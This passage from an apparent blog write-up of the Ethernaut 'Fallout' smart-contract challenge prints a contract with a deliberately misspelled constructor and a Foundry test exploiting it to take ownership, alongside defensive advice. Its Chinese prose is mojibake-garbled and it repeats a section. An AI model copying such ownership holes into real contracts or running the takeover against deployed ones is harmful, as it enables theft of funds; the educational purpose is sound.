O</li>\n<li><strong>å¤§å°å†™æ•æ„Ÿæ€§</strong> - Solidity åŒºåˆ†å¤§å°å†™</li>\n<li><strong>é¢å¤–å­—ç¬¦æ£€æŸ¥</strong> - ä¸‹åˆ’çº¿ã€ç©ºæ ¼ç­‰</li>\n<li><strong>ç¼–ç é—®é¢˜</strong> - Unicode å­—ç¬¦æ··ç”¨</li>\n</ul>\n<h2 id=\"ğŸ”-å®é™…æ¡ˆä¾‹åˆ†æ\"><a href=\"#ğŸ”-å®é™…æ¡ˆä¾‹åˆ†æ\" class=\"headerlink\" title=\"ğŸ” å®é™…æ¡ˆä¾‹åˆ†æ\"></a>ğŸ” å®é™…æ¡ˆä¾‹åˆ†æ</h2><h3 id=\"å†å²ä¸Šçš„ç±»ä¼¼æ¼æ´\"><a href=\"#å†å²ä¸Šçš„ç±»ä¼¼æ¼æ´\" class=\"headerlink\" title=\"å†å²ä¸Šçš„ç±»ä¼¼æ¼æ´\"></a>å†å²ä¸Šçš„ç±»ä¼¼æ¼æ´</h3><ol>\n<li><p><strong>Rubixi æ™ºèƒ½åˆçº¦</strong> (2016)</p>\n<ul>\n<li>åˆçº¦ä» <code>DynamicPyramid</code> é‡å‘½åä¸º <code>Rubixi</code></li>\n<li>å¿˜è®°æ›´æ–°æ„é€ å‡½æ•°åç§°</li>\n<li>å¯¼è‡´ä»»ä½•äººéƒ½å¯ä»¥æˆä¸º owner</li>\n</ul>\n</li>\n<li><p><strong>å…¶ä»–ç±»ä¼¼æ¡ˆä¾‹</strong></p>\n<ul>\n<li>å¤åˆ¶ç²˜è´´ä»£ç æ—¶å¿˜è®°ä¿®æ”¹å‡½æ•°å</li>\n<li>å›¢é˜Ÿåä½œä¸­çš„æ²Ÿé€šå¤±è¯¯</li>\n<li>è‡ªåŠ¨åŒ–é‡æ„å·¥å…·çš„ç¼ºé™·</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"æ¼æ´å½±å“è¯„ä¼°\"><a href=\"#æ¼æ´å½±å“è¯„ä¼°\" class=\"headerlink\" title=\"æ¼æ´å½±å“è¯„ä¼°\"></a>æ¼æ´å½±å“è¯„ä¼°</h3><ul>\n<li><strong>ç›´æ¥å½±å“</strong>: å®Œå…¨ä¸§å¤±åˆçº¦æ§åˆ¶æƒ</li>\n<li><strong>èµ„é‡‘é£é™©</strong>: åˆçº¦ä¸­çš„æ‰€æœ‰èµ„é‡‘</li>\n<li><strong>ä¿®å¤éš¾åº¦</strong>: æ— æ³•ä¿®å¤ï¼Œéœ€è¦é‡æ–°éƒ¨ç½²</li>\n<li><strong>æ£€æµ‹éš¾åº¦</strong>: æä½ï¼Œä½†å®¹æ˜“è¢«å¿½è§†</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Fallout å…³å¡å±•ç¤ºäº†ä¸€ä¸ªçœ‹ä¼¼å¾®ä¸è¶³é“ä½†åæœä¸¥é‡çš„æ¼æ´ï¼š</p>\n<ul>\n<li>âœ… <strong>ç»†èŠ‚å†³å®šæˆè´¥</strong> - ä¸€ä¸ªå­—ç¬¦çš„å·®å¼‚å¯¼è‡´å®Œå…¨ä¸åŒçš„ç»“æœ</li>\n<li>âœ… <strong>å·¥å…·çš„é‡è¦æ€§</strong> - ç°ä»£ç¼–è¯‘å™¨å’Œå·¥å…·å¯ä»¥é¿å…æ­¤ç±»é”™è¯¯</li>\n<li>âœ… <strong>ä»£ç å®¡è®¡çš„ä»·å€¼</strong> - äººå·¥å®¡è®¡èƒ½å‘ç°å·¥å…·é—æ¼çš„é—®é¢˜</li>\n<li>âœ… <strong>ç‰ˆæœ¬å‡çº§çš„å¿…è¦æ€§</strong> - ä½¿ç”¨æœ€æ–°çš„å®‰å…¨ç‰¹æ€§</li>\n</ul>\n<p>è¿™ä¸ªæ¡ˆä¾‹æé†’æˆ‘ä»¬ï¼Œåœ¨æ™ºèƒ½åˆçº¦å¼€å‘ä¸­ï¼Œ<strong>æ²¡æœ‰å°é”™è¯¯ï¼Œåªæœ‰å¤§æŸå¤±</strong>ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">ä¸Šä¸€å…³: Level 1 - Fallback</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">ä¸‹ä¸€å…³: Level 3 - Coin Flip</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n<hr>\n<p><em>é­”é¬¼è—åœ¨ç»†èŠ‚ä¸­ï¼Œå®‰å…¨å§‹äºæ¯ä¸€ä¸ªå­—ç¬¦ã€‚</em> ğŸ”</p>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-2-Fallout-æ„é€ å‡½æ•°å‘½åæ¼æ´\"><a href=\"#ğŸ¯-Ethernaut-Level-2-Fallout-æ„é€ å‡½æ•°å‘½åæ¼æ´\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 2: Fallout - æ„é€ å‡½æ•°å‘½åæ¼æ´\"></a>ğŸ¯ Ethernaut Level 2: Fallout - æ„é€ å‡½æ•°å‘½åæ¼æ´</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/2\">Ethernaut Level 2 - Fallout</a><br><strong>æ”»å‡»ç±»å‹</strong>: æ„é€ å‡½æ•°å‘½åé”™è¯¯ã€å†å²æ¼æ´<br><strong>éš¾åº¦</strong>: â­â˜†â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¿™ä¸ªå…³å¡è€ƒæŸ¥çš„æ˜¯å¼€å‘è€…åœ¨ä»£ç ç¼–å†™ä¸­çš„ç»†å¿ƒç¨‹åº¦ï¼š</p>\n<ol>\n<li><strong>è·å–åˆçº¦æ§åˆ¶æƒ</strong> - æˆä¸ºåˆçº¦çš„ <code>owner</code></li>\n<li><strong>ç†è§£å†å²æ¼æ´</strong> - å­¦ä¹  Solidity æ—©æœŸç‰ˆæœ¬çš„å®‰å…¨é—®é¢˜</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Fallout &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    using SafeMath for uint256;</span><br><span class=\"line\">    mapping (address =&gt; uint) allocations;</span><br><span class=\"line\">    address payable public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    /* constructor */</span><br><span class=\"line\">    function Fal1out() public payable &#123;  // ğŸš¨ æ³¨æ„è¿™é‡Œçš„æ‹¼å†™ï¼</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        allocations[owner] = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function allocate() public payable &#123;</span><br><span class=\"line\">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function sendAllocation(address payable allocator) public &#123;</span><br><span class=\"line\">        require(allocations[allocator] &gt; 0);</span><br><span class=\"line\">        allocator.transfer(allocations[allocator]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function collectAllocations() public onlyOwner &#123;</span><br><span class=\"line\">        msg.sender.transfer(address(this).balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class=\"line\">        return allocations[allocator];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ¼æ´è¯†åˆ«\"><a href=\"#æ¼æ´è¯†åˆ«\" class=\"headerlink\" title=\"æ¼æ´è¯†åˆ«\"></a>æ¼æ´è¯†åˆ«</h3><p>ä»”ç»†è§‚å¯Ÿåˆçº¦ä»£ç ï¼Œæˆ‘ä»¬å‘ç°ä¸€ä¸ª<strong>æå…¶å¾®å¦™ä½†è‡´å‘½çš„é”™è¯¯</strong>ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// åˆçº¦åç§°</span><br><span class=\"line\">contract Fallout &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /* constructor */</span><br><span class=\"line\">    function Fal1out() public payable &#123;  // âŒ è¿™é‡Œæ˜¯ &quot;Fal1out&quot; (æ•°å­—1)</span><br><span class=\"line\">        owner = msg.sender;             // è€Œä¸æ˜¯ &quot;Fallout&quot; (å­—æ¯l)</span><br><span class=\"line\">        allocations[owner] = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å†å²èƒŒæ™¯\"><a href=\"#å†å²èƒŒæ™¯\" class=\"headerlink\" title=\"å†å²èƒŒæ™¯\"></a>å†å²èƒŒæ™¯</h3><p>åœ¨ <strong>Solidity 0.4.22</strong> ä¹‹å‰ï¼Œæ„é€ å‡½æ•°çš„å®šä¹‰æ–¹å¼æ˜¯ï¼š</p>\n<ul>\n<li>åˆ›å»ºä¸€ä¸ªä¸åˆçº¦åç§°<strong>å®Œå…¨ç›¸åŒ</strong>çš„å‡½æ•°</li>\n<li>è¯¥å‡½æ•°ä¼šåœ¨åˆçº¦éƒ¨ç½²æ—¶è‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡</li>\n</ul>\n<p>ä½†åœ¨è¿™ä¸ªåˆçº¦ä¸­ï¼š</p>\n<ul>\n<li>åˆçº¦åç§°æ˜¯ <code>Fallout</code>ï¼ˆå­—æ¯ lï¼‰</li>\n<li>å‡½æ•°åç§°æ˜¯ <code>Fal1out</code>ï¼ˆæ•°å­— 1ï¼‰</li>\n</ul>\n<p><strong>ç»“æœ</strong>: è¿™ä¸ªå‡½æ•°ä¸æ˜¯æ„é€ å‡½æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>æ™®é€šçš„å…¬å¼€å‡½æ•°</strong>ï¼</p>\n<h3 id=\"æ”»å‡»è·¯å¾„\"><a href=\"#æ”»å‡»è·¯å¾„\" class=\"headerlink\" title=\"æ”»å‡»è·¯å¾„\"></a>æ”»å‡»è·¯å¾„</h3><ol>\n<li><strong>è¯†åˆ«ä¼ªè£…çš„æ„é€ å‡½æ•°</strong> - å‘ç° <code>Fal1out()</code> å‡½æ•°å¯ä»¥è¢«ä»»ä½•äººè°ƒç”¨</li>\n<li><strong>ç›´æ¥è°ƒç”¨å‡½æ•°</strong> - è°ƒç”¨ <code>Fal1out()</code> æˆä¸º <code>owner</code></li>\n<li><strong>éªŒè¯æƒé™è·å–</strong> - ç¡®è®¤å·²è·å¾—åˆçº¦æ§åˆ¶æƒ</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Fallout.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract FalloutTest is Test &#123;</span><br><span class=\"line\">    Fallout public instance;</span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²ç›®æ ‡åˆçº¦</span><br><span class=\"line\">        instance = new Fallout();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç»™æ”»å‡»è€…ä¸€äº›åˆå§‹èµ„é‡‘</span><br><span class=\"line\">        vm.deal(attacker, 1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testFalloutExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;Original owner:&quot;, instance.owner());</span><br><span class=\"line\">        console.log(&quot;Attacker address:&quot;, attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ”»å‡»æ­¥éª¤ï¼šç›´æ¥è°ƒç”¨é”™è¯¯å‘½åçš„&quot;æ„é€ å‡½æ•°&quot;</span><br><span class=\"line\">        instance.Fal1out&#123;value: 0.001 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance.owner(), attacker);</span><br><span class=\"line\">        console.log(&quot;New owner:&quot;, instance.owner());</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testOriginalOwnerIsZero() public view &#123;</span><br><span class=\"line\">        // éªŒè¯åˆçº¦éƒ¨ç½²åæ²¡æœ‰ownerï¼ˆå› ä¸ºæ„é€ å‡½æ•°æœªæ‰§è¡Œï¼‰</span><br><span class=\"line\">        assertEq(instance.owner(), address(0));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è¿è¡Œ Fallout å…³å¡æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FalloutTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># é¢„æœŸè¾“å‡ºï¼š</span></span><br><span class=\"line\"><span class=\"comment\"># [PASS] testFalloutExploit()</span></span><br><span class=\"line\"><span class=\"comment\"># [PASS] testOriginalOwnerIsZero()</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"ç°ä»£-Solidity-è§£å†³æ–¹æ¡ˆ\"><a href=\"#ç°ä»£-Solidity-è§£å†³æ–¹æ¡ˆ\" class=\"headerlink\" title=\"ç°ä»£ Solidity è§£å†³æ–¹æ¡ˆ\"></a>ç°ä»£ Solidity è§£å†³æ–¹æ¡ˆ</h3><p>ä» <strong>Solidity 0.4.22</strong> å¼€å§‹ï¼Œå¼•å…¥äº† <code>constructor</code> å…³é”®å­—ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureFallout &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    mapping (address =&gt; uint) allocations;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // âœ… ä½¿ç”¨ constructor å…³é”®å­—</span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // å…¶ä»–å‡½æ•°...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å®‰å…¨æœ€ä½³å®è·µ\"><a href=\"#å®‰å…¨æœ€ä½³å®è·µ\" class=\"headerlink\" title=\"å®‰å…¨æœ€ä½³å®è·µ\"></a>å®‰å…¨æœ€ä½³å®è·µ</h3><ol>\n<li><p><strong>ä½¿ç”¨ç°ä»£è¯­æ³•</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ æ—§ç‰ˆæœ¬ï¼ˆå®¹æ˜“å‡ºé”™ï¼‰</span><br><span class=\"line\">function ContractName() public &#123;</span><br><span class=\"line\">    // æ„é€ é€»è¾‘</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… æ–°ç‰ˆæœ¬ï¼ˆæ˜ç¡®ä¸”å®‰å…¨ï¼‰</span><br><span class=\"line\">constructor() &#123;</span><br><span class=\"line\">    // æ„é€ é€»è¾‘</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ä»£ç å®¡è®¡æ£€æŸ¥æ¸…å•</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// æ£€æŸ¥é¡¹ç›®ï¼š</span><br><span class=\"line\">// âœ… æ„é€ å‡½æ•°åç§°ä¸åˆçº¦åç§°æ˜¯å¦å®Œå…¨åŒ¹é…</span><br><span class=\"line\">// âœ… æ˜¯å¦ä½¿ç”¨äº†ç°ä»£ constructor è¯­æ³•</span><br><span class=\"line\">// âœ… æ˜¯å¦æœ‰å¤šä¸ªç±»ä¼¼æ„é€ å‡½æ•°çš„å‡½æ•°</span><br><span class=\"line\">// âœ… æƒé™åˆå§‹åŒ–æ˜¯å¦æ­£ç¡®æ‰§è¡Œ</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ç¼–è¯‘å™¨è­¦å‘Š</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ç°ä»£ç¼–è¯‘å™¨ä¼šå¯¹å¯ç–‘çš„å‡½æ•°åå‘å‡ºè­¦å‘Š</span></span><br><span class=\"line\">Warning: Function state mutability can be restricted to pure</span><br><span class=\"line\">Warning: This <span class=\"keyword\">function</span> has the same name as the contract</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"1-Solidity-ç‰ˆæœ¬æ¼”è¿›\"><a href=\"#1-Solidity-ç‰ˆæœ¬æ¼”è¿›\" class=\"headerlink\" title=\"1. Solidity ç‰ˆæœ¬æ¼”è¿›\"></a>1. Solidity ç‰ˆæœ¬æ¼”è¿›</h3><table>\n<thead>\n<tr>\n<th>ç‰ˆæœ¬</th>\n<th>æ„é€ å‡½æ•°è¯­æ³•</th>\n<th>å®‰å…¨æ€§</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&lt; 0.4.22</td>\n<td><code>function ContractName()</code></td>\n<td>âŒ å®¹æ˜“æ‹¼å†™é”™è¯¯</td>\n</tr>\n<tr>\n<td>&gt;&#x3D; 0.4.22</td>\n<td><code>constructor()</code></td>\n<td>âœ… æ˜ç¡®ä¸”å®‰å…¨</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-å¸¸è§å‘½åé”™è¯¯\"><a href=\"#2-å¸¸è§å‘½åé”™è¯¯\" class=\"headerlink\" title=\"2. å¸¸è§å‘½åé”™è¯¯\"></a>2. å¸¸è§å‘½åé”™è¯¯</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MyContract &#123;</span><br><span class=\"line\">    // âŒ å¸¸è§é”™è¯¯ç±»å‹</span><br><span class=\"line\">    function MyContracr() public &#123; &#125;  // æ‹¼å†™é”™è¯¯</span><br><span class=\"line\">    function myContract() public &#123; &#125;  // å¤§å°å†™é”™è¯¯</span><br><span class=\"line\">    function MyContract_() public &#123; &#125; // å¤šä½™å­—ç¬¦</span><br><span class=\"line\">    function MyContract() public &#123; &#125;  // å¯èƒ½æ­£ç¡®ï¼Œä½†ä¸æ¨è</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-ä»£ç å®¡è®¡é‡ç‚¹\"><a href=\"#3-ä»£ç å®¡è®¡é‡ç‚¹\" class=\"headerlink\" title=\"3. ä»£ç å®¡è®¡é‡ç‚¹\"></a>3. ä»£ç å®¡è®¡é‡ç‚¹</h3><ul>\n<li><strong>å­—ç¬¦ç›¸ä¼¼æ€§æ£€æŸ¥</strong> - 1 vs l, 0 vs O</li>\n<li><strong>å¤§å°å†™æ•æ„Ÿæ€§</strong> - Solidity åŒºåˆ†å¤§å°å†™</li>\n<li><strong>é¢å¤–å­—ç¬¦æ£€æŸ¥</strong> - ä¸‹åˆ’çº¿ã€ç©ºæ ¼ç­‰</li>\n<li><strong>ç¼–ç é—®é¢˜</strong> - Unicode å­—ç¬¦æ··ç”¨</li>\n</ul>\n<h2 id=\"ğŸ”-å®é™…æ¡ˆä¾‹åˆ†æ\"><a href=\"#ğŸ”-å®é™…æ¡ˆä¾‹åˆ†æ\" class=\"headerlink\" title=\"ğŸ” å®é™…æ¡ˆä¾‹åˆ†æ\"></a>ğŸ” å®é™…æ¡ˆä¾‹åˆ†æ</h2><h3 id=\"å†å²ä¸Šçš„ç±»ä¼¼æ¼æ´\"><a href=\"#å†å²ä¸Šçš„ç±»ä¼¼æ¼æ´\" class=\"headerlink\" title=\"å†å²ä¸Šçš„ç±»ä¼¼æ¼æ´\"></a>å†å²ä¸Šçš„ç±»ä¼¼æ¼æ´</h3><ol>\n<li><p><strong>Rubixi æ™ºèƒ½åˆçº¦</strong> (2016)</p>\n<ul>\n<li>åˆçº¦ä» <code>DynamicPyramid</code> é‡å‘½åä¸º <code>Rubixi</code></li>\n<li>å¿˜è®°æ›´æ–°æ„é€ å‡½æ•°åç§°</li>\n<li>å¯¼è‡´ä»»ä½•äººéƒ½å¯ä»¥æˆä¸º owner</li>\n</ul>\n</li>\n<li><p><strong>å…¶ä»–ç±»ä¼¼æ¡ˆä¾‹</strong></p>\n<ul>\n<li>å¤åˆ¶ç²˜è´´ä»£ç æ—¶å¿˜è®°ä¿®æ”¹å‡½æ•°å</li>\n<li>å›¢é˜Ÿåä½œä¸­çš„æ²Ÿé€šå¤±è¯¯</li>\n<li>è‡ªåŠ¨åŒ–é‡æ„å·¥å…·çš„ç¼ºé™·</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"æ¼æ´å½±å“è¯„ä¼°\"><a href=\"#æ¼æ´å½±å“è¯„ä¼°\" class=\"headerlink\" title=\"æ¼æ´å½±å“è¯„ä¼°\"></a>æ¼æ´å½±å“è¯„ä¼°</h3><ul>\n<li><strong>ç›´æ¥å½±å“</strong>: å®Œå…¨ä¸§å¤±åˆçº¦æ§åˆ¶æƒ</li>\n<li><strong>èµ„é‡‘é£é™©</strong>: åˆçº¦ä¸­çš„æ‰€æœ‰èµ„é‡‘</li>\n<li><strong>ä¿®å¤éš¾åº¦</strong>: æ— æ³•ä¿®å¤ï¼Œéœ€è¦é‡æ–°éƒ¨ç½²</li>\n<li><strong>æ£€æµ‹éš¾åº¦</strong>: æä½ï¼Œä½†å®¹æ˜“è¢«å¿½è§†</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" 